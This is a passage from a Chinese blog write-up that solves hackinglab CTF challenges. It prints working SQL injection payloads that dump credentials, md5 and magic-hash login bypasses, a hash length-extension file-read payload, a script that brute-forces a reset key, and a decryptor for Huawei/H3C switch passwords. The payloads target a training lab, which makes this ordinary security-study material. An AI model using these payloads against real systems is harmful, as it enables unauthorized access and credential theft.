+<p>得到表名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php</span><br><span class="line">?username=admin<span class="string">' union select count(*),concat(0x3a,0x3a,(select distinct table_name from information_schema.columns where table_schema=database() limit 0,1),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a %23</span></span><br></pre></td></tr></table></figure></p>
+<p>得到字段名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin<span class="string">' union select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=0x6c6f67 limit 0,1),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a %23</span></span><br></pre></td></tr></table></figure></p>
+<p>得到表中有多少条数据<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin<span class="string">' union select count(*),concat(0x3a,0x3a,(select count(*) from motto),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a %23</span></span><br></pre></td></tr></table></figure></p>
+<p>脱裤失败<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php</span><br><span class="line">?username=admin<span class="string">' union select count(*),concat(0x3a,0x3a,(select username from motto limit 0,1),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a %23</span></span><br></pre></td></tr></table></figure></p>
+<p>尝试别的语句<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin<span class="string">' and extractvalue(1, concat(0x3a,(SELECT distinct concat(0x3a,username,0x3a,motto,0x3a,0x3a) FROM motto limit 3,1)))%23</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>sqlmap可以跑出来，网络连接不太好容易断。</p>
+<h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><p>在cookie后面加上了一个id=\,报错<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=\</span><br></pre></td></tr></table></figure></p>
+<p>得到字段长度<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=2 order by 4</span><br></pre></td></tr></table></figure></p>
+<p>得到显示位<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=0 union select 1,2,3</span><br></pre></td></tr></table></figure></p>
+<p>得到表名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=0 union select 1,2,(select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database())</span><br></pre></td></tr></table></figure></p>
+<p>得到字段名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=0 union select 1,2,(select group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'sae_manager_sqli8'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>脱裤<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=0 union select id,username,password from sae_manager_sqli8</span><br></pre></td></tr></table></figure></p>
+<h2 id="哈希后的密码是不能产生注入的"><a href="#哈希后的密码是不能产生注入的" class="headerlink" title="哈希后的密码是不能产生注入的"></a>哈希后的密码是不能产生注入的</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">PLEASE LOGINT!&lt;noscript&gt;&lt;?php</span><br><span class="line">include <span class="string">"config.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'userid'</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">'pwd'</span>]))&#123;</span><br><span class="line">   <span class="variable">$strsql</span>=<span class="string">"select * from `user` where userid="</span>.intval(<span class="variable">$_GET</span>[<span class="string">'userid'</span>]).<span class="string">" and password='"</span>.md5(<span class="variable">$_GET</span>[<span class="string">'pwd'</span>], <span class="literal">true</span>) .<span class="string">"'"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$conn</span>=mysql_connect(<span class="variable">$dbhost</span>,<span class="variable">$username</span>,<span class="variable">$pwd</span>);</span><br><span class="line">    mysql_select_db(<span class="variable">$db</span>,<span class="variable">$conn</span>);</span><br><span class="line">    <span class="variable">$result</span>=mysql_query(<span class="variable">$strsql</span>);</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="variable">$row</span>=mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line">    mysql_close(<span class="variable">$conn</span>);</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">    print_r(<span class="variable">$row</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>!=null)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Flag: "</span>.<span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"PLEASE LOGINT!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;noscript&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> file_get_contents(__FILE__);</span><br></pre></td></tr></table></figure>
+<p>其中最关键的语句是</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select * from user <span class="built_in">where</span> userid=<span class="string">".intval(<span class="variable">$_GET</span>['userid'])."</span> and password=<span class="string">'".md5($_GET['</span><span class="built_in">pwd</span><span class="string">'], true) ."'</span>。</span><br></pre></td></tr></table></figure>
+<p>对传入的userid使用了intval()函数转化为数字，同时将password使用md5()函数进行转化。这就是一个典型的MD5加密后的SQL注入。<br>其中最主要的就是md5()函数，当第二个参数为true时，会返回16字符的二进制格式。当为false的时候，返回的就是32字符十六进制数。默认的是false模式。具体的差别通过下面这个代码来看。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">md5(<span class="string">"123456"</span>);			e10adc3949ba59abbe56e057f20f883e</span><br><span class="line">md5(<span class="string">"123456"</span>,<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+<p>可以看到当参数为true的时候，md5之后的值就会乱码。<br>那么只要md5(str,true)之后的值是包含了’or’<trash>这样的字符串，那么sql语句就会变为select 8 from users where usrid=”XXX” and password=’’or’<trash>‘。如此就可以绕过了。那么这样的str字符串存在吗？所幸还好存在一个，就是ffifdyop。那么我们最终的payload就是：</trash></trash></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/code1_9f44bab1964d2f959cf509763980e156/?userid=1&amp;<span class="built_in">pwd</span>=ffifdyop</span><br></pre></td></tr></table></figure>
+<p>或者<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/code1_9f44bab1964d2f959cf509763980e156/?userid=1&amp;<span class="built_in">pwd</span>=129581926211651571912466741651878684928</span><br></pre></td></tr></table></figure></p>
+<h1 id="解密关"><a href="#解密关" class="headerlink" title="解密关"></a>解密关</h1><h2 id="以管理员身份登录系统"><a href="#以管理员身份登录系统" class="headerlink" title="以管理员身份登录系统"></a>以管理员身份登录系统</h2><p>sukey 值是为时间戳取整，MD5加密而来的<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">import requests</span><br><span class="line">import hashlib</span><br><span class="line">import time</span><br><span class="line">se=requests.session()</span><br><span class="line">header=&#123;<span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=c55e14d0b2191166af88d0ac03c48113'</span>&#125;</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    sukey=hashlib.new(<span class="string">'md5'</span>,str(int(time.time())).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    url=<span class="string">"http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey="</span>+sukey+<span class="string">"&amp;username=admin"</span></span><br><span class="line">    r=se.get(url,headers=header)</span><br><span class="line">    time.sleep(0.5)</span><br><span class="line">    <span class="keyword">if</span> r.content:</span><br><span class="line">        <span class="built_in">print</span>(r.content)</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'Cracking:'</span>+sukey)</span><br></pre></td></tr></table></figure></p>
+<h2 id="邂逅对门的妹纸"><a href="#邂逅对门的妹纸" class="headerlink" title="邂逅对门的妹纸"></a>邂逅对门的妹纸</h2><p> 先生成字典。<br> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">with open(<span class="string">"password.txt"</span>,<span class="string">"w"</span>) as f:</span><br><span class="line">   <span class="keyword">for</span> year <span class="keyword">in</span> range(1933,1936):</span><br><span class="line">       <span class="keyword">for</span> month <span class="keyword">in</span> range(1,13):</span><br><span class="line">           <span class="keyword">for</span> day <span class="keyword">in</span> range(1,32):</span><br><span class="line">               f.write(<span class="string">"%d%02d%02d\n"</span>%(year,month,day))</span><br></pre></td></tr></table></figure></p>
+<p>  用 EWSA 爆破失败，不知啥原因，以后再研究。</p>
+<h2 id="思科密码破解"><a href="#思科密码破解" class="headerlink" title="思科密码破解"></a>思科密码破解</h2><p><a href="http://www.ifm.net.nz/cookbooks/passwordcracker.html" target="_blank" rel="noopener">在线解密</a></p>
+<h2 id="uawei-h3c-交换机的加密密码"><a href="#uawei-h3c-交换机的加密密码" class="headerlink" title="uawei/h3c 交换机的加密密码"></a>uawei/h3c 交换机的加密密码</h2><p>在window下无法运行此脚本，在kail下即可得。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">from Crypto.Cipher import DES</span><br><span class="line"></span><br><span class="line">def decode_char(c):</span><br><span class="line">    <span class="keyword">if</span> c == <span class="string">'a'</span>:</span><br><span class="line">        r = <span class="string">'?'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = c</span><br><span class="line">    <span class="built_in">return</span> ord(r) - ord(<span class="string">'!'</span>)</span><br><span class="line"></span><br><span class="line">def ascii_to_binary(s):</span><br><span class="line">    assert len(s) == 24</span><br><span class="line">    out = [0]*18</span><br><span class="line">    i = 0</span><br><span class="line">    j = 0</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0, len(s), 4):</span><br><span class="line">        y = decode_char(s[i + 0])</span><br><span class="line">        y = (y &lt;&lt; 6) &amp; 0xffffff</span><br><span class="line">        k = decode_char(s[i + 1])</span><br><span class="line">        </span><br><span class="line">        y = (y | k) &amp; 0xffffff</span><br><span class="line">        y = (y &lt;&lt; 6) &amp; 0xffffff</span><br><span class="line">        k = decode_char(s[i + 2])</span><br><span class="line">        </span><br><span class="line">        y = (y | k) &amp; 0xffffff</span><br><span class="line">        y = (y &lt;&lt; 6) &amp; 0xffffff</span><br><span class="line">        k = decode_char(s[i + 3])</span><br><span class="line">        y = (y | k) &amp; 0xffffff</span><br><span class="line"></span><br><span class="line">        out[j+2] = chr(y       &amp; 0xff)</span><br><span class="line">        out[j+1] = chr((y&gt;&gt;8)  &amp; 0xff)</span><br><span class="line">        out[j+0] = chr((y&gt;&gt;16) &amp; 0xff)</span><br><span class="line"></span><br><span class="line">        j += 3</span><br><span class="line">    <span class="built_in">return</span> <span class="string">""</span>.join(out)</span><br><span class="line"></span><br><span class="line">def decrypt_password(p):</span><br><span class="line">    r = ascii_to_binary(p)</span><br><span class="line">    r = r[:16]</span><br><span class="line">    d = DES.new(<span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08"</span>, DES.MODE_ECB)</span><br><span class="line">    r = d.decrypt(r)</span><br><span class="line">    <span class="built_in">return</span> r.rstrip(<span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    miwen = <span class="string">"aK9Q4I)J'#[Q=^Q`MAF4&lt;1!!"</span></span><br><span class="line">    <span class="built_in">print</span> u<span class="string">'明文'</span> + decrypt_password(miwen)</span><br><span class="line">    </span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line"><span class="comment">## 异常数据</span></span><br><span class="line"></span><br><span class="line">字母全部转换为大写的base64。</span><br><span class="line"></span><br><span class="line">``` bash</span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">import re</span><br><span class="line">from base64 import *</span><br><span class="line"></span><br><span class="line">def change(res,arr,pos):</span><br><span class="line">    res.append(<span class="string">''</span>.join(arr))</span><br><span class="line">    i=pos</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(i,len(arr)):</span><br><span class="line">        <span class="keyword">if</span> arr[i]&lt;=<span class="string">'Z'</span> and arr[i]&gt;=<span class="string">'A'</span>:</span><br><span class="line">            arr[i]=arr[i].lower()</span><br><span class="line">            change(res,arr,i+1)</span><br><span class="line">            arr[i]=arr[i].upper()</span><br><span class="line"></span><br><span class="line">arr=list(<span class="string">'AGV5IULSB3ZLVSE='</span>)</span><br><span class="line">res=[]</span><br><span class="line">change(res,arr,0)</span><br><span class="line"></span><br><span class="line">res_decode=map(b64decode,res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res_decode:</span><br><span class="line">    <span class="keyword">if</span> re.findall(r<span class="string">'\\x'</span>,repr(i)):</span><br><span class="line">        <span class="built_in">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure></p>
+<h2 id="md5真的能碰撞嘛"><a href="#md5真的能碰撞嘛" class="headerlink" title="md5真的能碰撞嘛?"></a>md5真的能碰撞嘛?</h2><p><a href="https://www.waitalone.cn/php-sec-bugs.html" target="_blank" rel="noopener">php特性隐患</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span>=FLAG;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">"password"</span>]))&#123;</span><br><span class="line">	<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line">    <span class="variable">$rootadmin</span>=<span class="string">"!1793422703!"</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$rootadmin</span>)&#123;die(<span class="string">"Please do not attack admin account!"</span>);&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$password</span>)==md5(<span class="variable">$rootadmin</span>))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">"Password Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>$rootadmin加密后的值为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">md5(!1793422703!,32) = 0e332932043729729062996282883873</span><br><span class="line">md5(QNKCDZO,32) = 0e830400451993494058024219903391</span><br><span class="line">md5(240610708,32) = 0e462097431906509019562988736854</span><br></pre></td></tr></table></figure></p>
+<p>构造payload: ?password=QNKCDZO</p>
+<h2 id="有签名限制的读取任意文件"><a href="#有签名限制的读取任意文件" class="headerlink" title="有签名限制的读取任意文件"></a>有签名限制的读取任意文件</h2><p><a href="http://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="noopener">哈希长度扩展攻击的简介以及HashPump安装使用方法</a></p>
+<p><a href="http://blog.csdn.net/zhankehua/article/details/51865788" target="_blank" rel="noopener">解法原文</a></p>
+<p>在kail下使用hashpump<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashpump -s f3d366138601b5afefbd4fc15731692e -d /etc/hosts -k 32 -a chen</span><br></pre></td></tr></table></figure></p>
+<p>得到，包’\x’换成%<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">3998b374350d22991b9c8f9885194a16</span><br><span class="line">/etc/hosts\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\x01\x00\x00\x00\x00\x00\x00chen</span><br></pre></td></tr></table></figure></p>
+<p>构造payload:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?filepath=/etc/hosts%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%00chen</span><br><span class="line">&amp;sign=3998b374350d22991b9c8f9885194a16</span><br></pre></td></tr></table></figure></p>
+<h1 id="综合关"><a href="#综合关" class="headerlink" title="综合关"></a>综合关</h1><h2 id="渗透测试第一期"><a href="#渗透测试第一期" class="headerlink" title="渗透测试第一期"></a>渗透测试第一期</h2><p>首先有注册和修改密码的选项，先注册一个账号并绑定手机号（查看网页源码得到），注册成功后，知道只有用admin账户登入，才能得到key。到忘记密码<br>选项去修改密码，发现弹不出手机的验证码。可以猜测到管理员的账号绑定的不是这个手机。突然想起在注册账号的时候有手机绑定，在手机绑定的时候，抓包，把用户名改成admin.绑定成功。然后在回到修改密码哪里，现在可以弹出验证码。修改后。弹出密码。用这个密码登入admin账户，登入成功。</p>
+<h2 id="没有注入到底能不能绕过登录"><a href="#没有注入到底能不能绕过登录" class="headerlink" title="没有注入到底能不能绕过登录"></a>没有注入到底能不能绕过登录</h2><p>通过robots.txt中可知一个不可访问的文件，直接访问，提示要先登入。<br>用admin账户，密码随便，登入，提示密码错误，不管弹框，直接输入刚才不可访问文件的链接，得到key。原来后台没有对登入账户进行校验，只要保持一个session就行。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">r = requests.Session()</span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/pentest3_307c0281537de1615673af8c1d54885a/'</span></span><br><span class="line">data = &#123;<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'password'</span>: <span class="string">'123'</span>&#125;</span><br><span class="line">r.post(url, data=data)</span><br><span class="line">url2 = <span class="string">'http://lab1.xseclab.com/pentest3_307c0281537de1615673af8c1d54885a/myadminroot/'</span></span><br><span class="line"><span class="built_in">print</span> (r.get(url2).content)</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://www.40huo.cn/blog/hackinglab-comp.html" target="_blank" rel="noopener">后面一些题目的解答</a></p>
+
+                
+<p class="pink-link-context">
+    <a href="/posts/dc43a318.html" rel="next" title="南京邮电大学ctf的web题">
+    Prev: 南京邮电大学ctf的web题
+  </a>
+</p>
+
+
+
+<p class="pink-link-context">
+    <a href="/posts/90656973.html" rel="next" title="RedTigers Hackit writeup">
+    Next: RedTigers Hackit writeup
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+</article>
+
+
+    <script src="../../js/av-min.js"></script>
+    <script src='../../js/Valine.min.js'></script>
+	<div style="background-color: #FFFFFF">
+    <div id="vcomments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments' ,
+			appId: 'ul15fj2BGxFoWtoSlntkMlMf-gzGzoHsz',
+			appKey: 'vvdd3JD38t8gwf4ytlq3ON3H',
+			notify: false, 
+			verify: false, 
+			avatar: 'wavatar', 
+			placeholder: 'ε = = (づ′▽`)づ '
+        })
+    </script>
+  </div>
+
+</div>
+
+		 
+		 
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large pink">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect green" title="Return to top"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse yellow darken-1"  data-activates="main-menu" title="Menu"><i class="fa fa-navicon"></i></a></li>
+    </ul>
+  </div>
+
+    </main>
+    <footer class="page-footer indigo darken-1">
+    
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">Social</h5>
+                
+                    <a class="social-link" href="#" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="#" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+                
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <div class="site-visitors-container white-text">
+        <span>
+            <i class="fa fa-user"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+        </span>
+        <span>&nbsp;|&nbsp;</span>
+        <span>
+            <i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+
+
+            </div>
+            
+
+            
+            <div class="col m8 s12">
+                <h5 class="white-text">Links</h5>
+                
+                    <a class="social-link" href="https://blog.csdn.net/Wuzebiao2016" target="_blank">wuzebiao</a>
+                
+                    <a class="social-link" href="http://www.ifuryst.com/" target="_blank">iFurySt</a>
+                
+                    <a class="social-link" href="http://daikersec.com/" target="_blank">daiker</a>
+                
+                    <a class="social-link" href="http://blog.dedsec.club" target="_blank">dedsec</a>
+                
+                    <a class="social-link" href="https://www.leavesongs.com/" target="_blank">离别歌</a>
+                
+                    <a class="social-link" href="https://www.sec-wiki.com/" target="_blank">Secwiki</a>
+                
+                    <a class="social-link" href="https://zhuanlan.kanxue.com/" target="_blank">看雪专栏</a>
+                
+                    <a class="social-link" href="http://www.itxueke.com/SecNavi/#3782" target="_blank">IT学客安全导航</a>
+                
+                    <a class="social-link" href="http://www.freebuf.com/" target="_blank">安全客</a>
+                
+                    <a class="social-link" href="https://yq.aliyun.com/articles/?spm=a2c4e.11155573.minheadermenu.3.6cd475c6d2FQvQ" target="_blank">云栖社区</a>
+                
+                    <a class="social-link" href="https://paper.seebug.org/" target="_blank">知道创宇</a>
+                
+                    <a class="social-link" href="https://www.waitalone.cn/pentest" target="_blank">独自等待</a>
+                
+                    <a class="social-link" href="https://3gstudent.github.io/3gstudent.github.io/" target="_blank">三好学生</a>
+                
+                    <a class="social-link" href="http://paper.tuisec.win/index.jsp" target="_blank">先知社区文章</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+
+    <div class="footer-copyright pink-link-context">
+        <div class="container">
+            © 2016 example.com, All rights reserved.
+            <p class="right" style="margin-top: 0;">Blog powered by <a href="https://hexo.io">Hexo</a> | Theme <a href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
+        </div>
+    </div>
+</footer>
+
+
+    <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass('pink lighten-2');
+
+            
+            // 添加new标签
+            $('menu-home, menu-archive, .menu-reading, .menu-about').append('<span class="new badge pink"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
